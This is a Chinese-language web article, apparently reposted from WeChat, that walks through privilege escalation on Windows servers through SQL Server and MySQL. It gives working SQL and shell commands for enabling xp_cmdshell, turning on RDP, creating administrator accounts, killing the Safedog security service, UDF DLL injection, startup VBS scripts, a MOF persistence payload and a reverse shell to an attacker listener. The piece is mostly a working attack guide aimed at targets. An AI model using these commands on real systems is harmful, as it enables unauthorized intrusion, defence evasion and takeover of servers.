\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/\_ivWThY8Iqu6IVQicQPYyw)

在利用系统溢出漏洞无果的情况下，可以尝试采用数据库进行提权。数据库提权的前提条件：拥有数据库最高权限用户密码。除 Access 数据库外，其他数据库基本都存在数据库提权的可能，本文主要针对 SQL server，MySQL 数据库提权进行记录。

SQL server，MySQL 都需要具备数据库管理员权限才可执行提权操作。linux 系统下 mysql root 用户是服务用户，权限不足以提权。Windows 下 mysql root 权限很高，在没有被降权的情况可以进行提权操作。但是 zkeys、宝塔等集成环境默认降权了 root 账号

**SQL server 数据库提权**
====================

**提权流程**：获取 SA 账号 > 远程数据库登录 > 安装提权组件 > 创建账号 > 开启 3389 > 远程系统登录 > 完成  

**一、SA 账号的获取**  
1\. 爆破获取账号密码  
2\. 网站源码，查看数据库连接文件。如 web.config、config.asp、conn.asp、dbconfig.asp。可能得到的账号名称不是 sa，但是具有系统权限。使用数据库软件连接数据库执行系统数据库的操作，若可以操作说明此账号具有 sa 权限。或者利用注入 sqlmap --is-dba 确认是否为 dba 权限。SQL server 默认允许 sa 外链登陆，mysql root 用户默认不允许外链登陆。

**二、提权**

**2.1 允许外联**

xp\_cmdshell 组件默认在 mssql 2000 中是开启的，在 mssql 2005 之后的版本中则默认禁止。拥有管理员 sa 权限则可以用 sp\_configure 开启该组件。  
1\. 使用已经得到的 sa 权限账号远程登录数据库  
2\. 启用 cmd\_shell 执行命令组件：

```
EXEC sp\_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXEC sp\_configure 'xp\_cmdshell', 1
GO
RECONFIGURE
GO
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjRvmofZHlSbwzr8p7rM37gPibI7SXEEH9gWOpSadWDfNp2qqtZhIhRTw/640?wx_fmt=png)  

3\. 组件启用成功，可执行系统命令。在此基础上进行系统账号创建操作：  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjKfvm3Re8ORy8QTMz40LGGTfkvFic2atsiaufTFcEwkcg52or38VBVHXA/640?wx_fmt=png)  
4\. 如果目标机器没有开启 3389，使用以下命令开启 3389  

```
exec master.dbo.xp\_regwrite'HKEY\_LOCAL\_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG\_DWORD',0;--
```

5\. 其他  

```
#停用cmd\_shell执行命令组件
EXEC sp\_configure 'show advanced options', 1
RECONFIGURE
EXEC sp\_configure 'xp\_cmdshell', 0
RECONFIGURE

#执行系统命令
EXEC master.dbo.xp\_cmdshell 'ipconfig'
#关闭3389
exec master.dbo.xp\_regwrite'HKEY\_LOCAL\_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG\_DWORD',1;
#如果xp\_cmdshell被删除了，可以上传xplog70.dll进行恢复
exec master.sys.sp\_addextendedproc 'xp\_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll'
```

**2.2 禁止外链**  
如果目标数据库没有开外链，我们无法从远程登录数据。则需要利用一些大马进行提权

1\. 拿到账号密码，在大马上登录数据库

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjF4WRCNOHCR5jHLcQDX09ic1sl0PWTCF0x83ia1kTwzGB1pWRDdP2l2dw/640?wx_fmt=png) 2. 开启 cmd\_shell  

```
EXEC sp\_configure 'show advanced options', 1;RECONFIGURE;EXEC sp\_configure 'xp\_cmdshell', 1;RECONFIGURE; 
#该语句适用于sql server 2005
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjRouqS2CvmjQPp0GibD0s3QSuicFXSO8D3lhglG4PF7jRqySE9wnw9ic0w/640?wx_fmt=png)

3\. 命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tjh2o7KnpXpRhD4OZvRlTCnVK230mboN90wKQm1UmyBbpMHSmic3yWD7g/640?wx_fmt=png)

4\. 开启 3389，远程登录

**2.3 过杀软**

以安全狗为例，利用 cmd\_shell 提权时安全狗不拦截创建账号操作，但是会拦截添加到管理员组的操作。可以将创建的用户添加到远程桌面组 (remote desktop users)，但是登陆进去了是普通用户，权限很低。这时可以对文件进行降权，降权之后可对系统盘进行操作：

1\. 降权

```
#将C盘设置为完全控制
cacls c:/e /t /g everyone:F
```

```
#system权限停用安全狗服务：
net stop "safedog guard center" /y
net stop "safedog update center" /y
net stop "safedogguardcenter" /y
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjnvicUoREuz2CUrxhTk5n2ZcZf9ia36ShxYzs037rx9ibFsSJA5CPjhLRQ/640?wx_fmt=png)

2\. 杀狗

```
#system权限删除安全狗服务：
sc stop "SafeDogGuardCenter"
sc config "SafeDogGuardCenter" start=disabled
sc delete "Safedogguardcenter"

sc stop "SafeDogupdateCenter"
sc config "SafeDogUpdateCenter" start=disabled
sc delete "SafedogUpdatecenter"

sc stop "SafeDogCloudHeler"
sc config "SafeDogCloudHeler" start=disabled
sc delete "SafeDogCloudHeler"
#重启服务器即可kill安全狗。
```

```
https://github.com/keyixiaxiang/xiaxiang-killer
```

3\. 其他  

```
mysqld --skip-grant-tables
# 跳过验证
mysql.exe -uroot    
# 进入MySQL
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjSoDuMR2ypDKE012kuc2DvhRqsibWsgMa8jYOaxU2ztccO8EEsHicAdjQ/640?wx_fmt=png)  

**MySQL 数据库提权**
===============

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tjtcon36gmMrldZicbWwbYesPnW66ggL9KicwFo1GaCZibicoUTo2VORkJ0g/640?wx_fmt=png)

**一、获取 root 账号**

1.1 查看网站源码里面数据库配置文件 (关键词: conn.php,config.php,dbconfig.php,config.inc.php,common.inc.php,inc,conn,config.sql,common,data，sql,data,inc,config,conn,database,common,include）  
一般来说云主机上面的网站配置文件一般数据库连接文件都是低权限账号，是根据不用站点创建不同数据库用户。单个服务器上的网站属于一个机构，这种情况可能拿下数据库配置文件直接是 root 账号。另外我们得到的账号不是 root 也有可能是 root 权限，能过获取 mysql 数据库信息一般是 root 权限。  

1.2 查看数据库安装路径 (select @@basedir) 下的 (/mysql/data/mysql/user.myd)下载，本地打开。  
情形一，可以直接读取账号密码：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjswxP688QN81sc00myQIjRg3sZCX1c0F5mGokf4icOIGWYJdHlNC4V1w/640?wx_fmt=png)  

情形二，得到的密文是不完整的或者管理员设置了其他密码不能登陆进去。下载 user.myd，user.frm,user.myi 三个数据库文件。替换到本地 mysql 数据库，注意 mysql 版本和目标保持版本一致确保兼容。替换完成后本地登陆 mysql  

```
Grant all privileges on \*.\* to 'root'@'%' identified by 'password' with grant option;
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjU6e0jgcOBwXwvrO7y0njYxy6qSLL2KyYFIDQzcNu7bYFsCITPk8ic7Q/640?wx_fmt=png)  

1.3 暴力破解（默认不能通过外部地址爆破，利用脚本在服务器进行本地破解）

①使用大马进行内部地址爆破：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tjkpcjc5nPUfKOHtUy0SHRYwGnAgWpibTThFbT82AeEhC58sWXuZiaC9icA/640?wx_fmt=png)  

②也可以上传数据库登录脚本，burp 抓包爆破 root 账号密码

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjrE2ib0LOdG8lQbrMQVwkS5rPkaVW701lHiaA58JhRA0ibJLCMDhdgZIDg/640?wx_fmt=png)  

③https://www.jb51.net/article/94867.htm

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjAx9iaWZZFtvDrxDv5ibkWpExpCoaUnOWluU98LWiaA8aOBoAxG3ccuYAg/640?wx_fmt=png)

**二、MySQL 开外链**
---------------

修改 user 表 host 字段为 %，表示允许任意地址登录 MySQL，开启外链接成功  

------------------------------------------------

```
win 2000: C:\\Winnt\\udf.dll    
win 2003: C:\\Windows\\udf.dll
```

开外联前  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjjejRNwyNZ2N8yic7tialeQaR3wEd5xRhNyPicXNFVYMHzBkkdD7V2pZVQ/640?wx_fmt=png)  

开外联后

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tj5Vc4Pe6lNmrAXiasUFrQAntEsFUJYDmHUOQGLZCAONpNwZNCgiatwpZw/640?wx_fmt=png)  

**三、UDF 提权**
------------

3.1 UDF 提权原理**：**udf(Userdefined function) 是用户自定义函数简写。通过 root 权限将文件 udf.dll 导出到系统目录下，可以通过 udf.dll 创建执行系统命令的函数来调用执行 cmd。现在基本上 windows 的服务器是以下两个路径导出 UDF.DLL  

```
#NTFS流创建plugin目录
select 'x' into dumpfile 'C:/Program Files/MySQL/MySQL Server 5.1/lib/plugin::INDEX\_ALLOCATION';
```

在 MySQL 高版本中 secure-file-priv 参数限制了 MySQL 的导出；  
① NULL，表示禁止  
② 如果 value 值有文件夹目录，则表示只允许该目录下文件（子目录都不行）  
③ 如果为空 (没有值)，则表示不限制目录  
MySQL5.0/5.6 版本：my.ini 中无此参数，查询该参数情况为空，不限制目录:  
MySQL5.7 版本：my.ini 中存在参数，查询该参数情况为 NULL，不允许导出:  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjKXDns1ibDwibyczq1rRok1NoicibZNcnF5IJ1Hne6BjkSBB2QzeWyQ1ccQ/640?wx_fmt=png)

**3.2. 提权**

**①** 创建 plugin 目录：

MySQL 5.1 以上版本需要导出到 mysql 安装目录 / lib/plugin/，5.1 以下直接安装在 c:/windows 目录下，如果 5.1 以上没有 plugin 目录，需要手工创建或者通过 NTFS 流创建目录：

```
select load\_file('d:\\\\wwwrooot\\\\network\\\\lib\_mysqludf\_sys\_64.dll') into dumpfile "D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll";
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tj7m8wbiae8WUvkP560HLa0OfDdEIQveJQyoRkj7u0boibeVWOL0yaXvmQ/640?wx_fmt=png)  

查看 plugin 目录：select @@plugin\_dir;

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tjvnc4R1MZEQQxicJSRmhnngQicvjsx5JibNyaHhA5AjvvGEriaSaGaNrfaA/640?wx_fmt=png)  

  
②导出 udf，如果脚本没法导出 udf 文件，也可以手动将该文件复制到 plugin 文件夹下（创建 plugin 目录、复制粘贴 udf 文件都需要一定的权限)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjW4ebCRkyW69BAhIxRDsTBhb7foH9tJzeR9NxmxG5OibUqA2Grc8vc8w/640?wx_fmt=png)

手工导入 udf 文件：

```
#安装
create function cmdshell returns string soname 'udf.dll'
#写入命令
select cmdshell('net user test 123.com /add');  
select cmdshell('net localgroup administrators test /add');  
drop function cmdshell; # 删除函数
```

③创建 shell 函数，创建完成后即可执行命令，也可以手动创建函数。

```
select sys\_eval('whoami')
```

当然使用 udf 马自带的功能更省事一点：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tjbfq37D6JYhiaemDm5PcmKhibT8JG8KVFfJ64b0PazZCcxDthVj4iaZJcw/640?wx_fmt=png)  

  
④提权成功，可以执行命令

```
#启动项目录：
win 08：C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
win 03：C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjOOxPbP35excBwJP8VMr9wNU0XNib1TVHxB85ZxTLCFPicafvTf5yraaw/640?wx_fmt=png)  

  
如果目标 mysql 版本小于 5.1。在这里导出即可

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjslSh02DFEBCXKiauqasurRrQZ6OdnZqfD2ibibf3ftUMmXcw1q8VxR9Ng/640?wx_fmt=png)  

**四、启动项提权**  

```
create database test;
```

4.1 创建 test 数据库

```
create table a (cmd text);
#创建了一个表名为a的表，表中只存放一个字段，字段名为cmd，text文本
```

4.2 在 TEST 数据库下创建一个新的表；

```
insert into a values ("set wshshell=createobject (""wscript.shell"")");
insert into a values ("a=wshshell.run (""cmd.exe /c net user test123 123456 /add"",0)");
insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators test123 /add"",0)");
# 调用cmd创建管理员,注意双引号和括号以及后面的"0"一定要输入,用这三条命令来建立一个VBS的脚本程序
select \* from a;
```

4.3 在表中插入内容  

```
select \* from a into outfile "C://ProgramData//Administrator//Windows//Start Menu//Programs//Startup//a.vbs";
```

4.4 将表输出为一个 VBS 的脚本文件

```
insert into a values ("set wshshell=createobject (""wscript.shell"")");
insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators test123 /add"",0)");
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjF81RmWS1tCgoYcus1LoRWAwJOL9w1xosHB046nZuXOAC5kQmVmUIGA/640?wx_fmt=png)

  
4.5 重启计算机，创建用户成功。实际情况可以利用服务器漏洞，如 ms12-020  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjpgDxWCJKJzf8AZHU6qjAicSnKSbW16iaiczw6xXCfhAfUVXmKmosqjkvQ/640?wx_fmt=png)

  
4.6 二次执行进行提权  
这里 test123 用户不是 administrators 组用户，使用相同的办法通过 mysql 命令重新写入 vbs 脚本。脚本内容为：  

```
\# 提权mof脚本
#pragma namespace("\\\\\\\\.\\\\root\\\\subscription")
#pragma namespace("\\\\\\\\.\\\\root\\\\subscription") 
instance of \_\_EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select \* From \_\_InstanceModificationEvent " 
            "Where TargetInstance Isa \\"Win32\_LocalTime\\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
};
instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
    "var WSH = new ActiveXObject(\\"WScript.Shell\\")\\nWSH.run(\\"net.exe user admin admin /add\\")"; 
}; 
instance of \_\_FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
```

然后加入启动项，再次重启计算机，此命令被执行，完成提权：  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjCg53OuL2NB2jTD5nm84vnWiauxFokA08LFjWt8bTkTPd7he6zTokZUQ/640?wx_fmt=png)  

**五、mof 提权**  

MOF 是 windows 系统的一个文件（在 c:/windows/system32/wbem/mof/nullevt.mof）叫做 "托管对象格式" 其作用是每隔五秒就会去监控进程创建和死亡。拥有 mysql 的 root 权限了以后，然后使用 root 权限去执行上传的 mof。隔了一定时间以后这个 mof 就会被执行，这个 mof 当中有一段是 vbs 脚本，里面包含 cmd 的添加管理员用户的命令。  

```
select load\_file('C:/Inetpub/wwwroot/8099/uploads/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
```

5.1 上传文件 1.mof，使用 sql 语句导出到 nullevt.mof 文件中  

```
nc -l -p 12345
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tj4bSib4L5jehibmevR1G1DrUP2ic49P3icRVGffHEBuPpDWdSacDV5v3OqQ/640?wx_fmt=png)  
5.2 隔一段时间服务器会自动执行此 mof 文件，文件代码内容是创建 admin/admin 用户  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjibCy1ECibK8nZUsGmnzNaQSMwibSIVBo890lEVkZxh5gRUNHfwHhJV2Aw/640?wx_fmt=png)  
5.3 用户创建成功。此时的 admin 用户只是普通用户权限  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tj5tvYCt6XDxBYibNv8e8Knhn8rXJKmT0tn5KFts0sDVOoDH2CmtRVPSw/640?wx_fmt=png)

  
5.4 提升权限  
把上面的命令再执行一遍，mof 文件脚本内容为添加 admin 用户为管理员。等待一段时间后再看 admin 用户，已经成功升级为管理员用户  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjKbDqbv35vhO7xib1lF1fOnLNmp4ylEGBEhHc4aSJ8NOmXy9m6DWunfw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tjg3jdAlTaDFxDxVD02SDoNmu8vs3RqccW35Kg62YZ0y4qeNDfQUBKag/640?wx_fmt=png)  

**六、反连端口提权**
------------

反链端口提权也是利用的 UDF 提权。只是直接 udf 提权遇到 waf 的话会被拦截禁止执行系统函数。使用端口转发过掉防护  

6.1 在 kali 上开启监听的端口

```
select backshell('192.168.1.5',12345)
# 192.168.1.5为kali的IP，12345是要反弹的端口
```

  
6.2 登陆，创建 plugin 目录，导出 udf  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tj3J68yg486DrVmH2Z2HjWcXHZ5Lvhhq9cUHyQwdicA7pyKApSD0KU3icg/640?wx_fmt=png)

  
6.3 创建反弹函数  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tjic1yBU5pPOnjMZ5rTGdZfyfiaS05nkpOX8UvR3ib6fDgaVaguSibtwnDAQ/640?wx_fmt=png)  

  
6.4. 执行反弹  

```
select backshell('192.168.1.5',12345)
# 192.168.1.5为kali的IP，12345是要反弹的端口
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjU9YHDbAd2Selicf3DhlCfImiaWdhRkGC5aR48ic7lnvQcMp6Uchbldjbw/640?wx_fmt=png)  
6.5 成功反弹 shell，完成提权  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0Tj1oJktQHENO8UJ0mC8uWp6lCfKvukuxtu9bfJia0diccxTkrFXeP7QA7Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNbiaY7hWWXFuN62eMa5tf0TjL1LFEyibUoJibfK0OqXmtwnxaibC3HjRjsujBia3sVGNz0pHfzHzFoictRg/640?wx_fmt=jpeg)